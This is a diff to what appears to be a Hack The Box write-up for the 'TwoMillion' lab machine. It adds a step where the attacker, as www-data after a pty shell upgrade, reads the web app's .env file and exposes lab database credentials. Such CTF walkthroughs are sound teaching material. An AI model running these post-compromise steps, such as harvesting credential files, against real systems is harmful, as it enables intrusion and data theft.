@@ -499,3 +499,16 @@ Shell Upgrade
 www-data@2million:~/html$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/bec35870-0a36-4190-af0f-469245a9b7c5)
+
+Environment File
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/4a8741ed-abf9-4f05-947d-f2dd87c3a01b)
+
+```shell
+www-data@2million:~/html$ cat .env
+cat .env
+DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123
+```
+
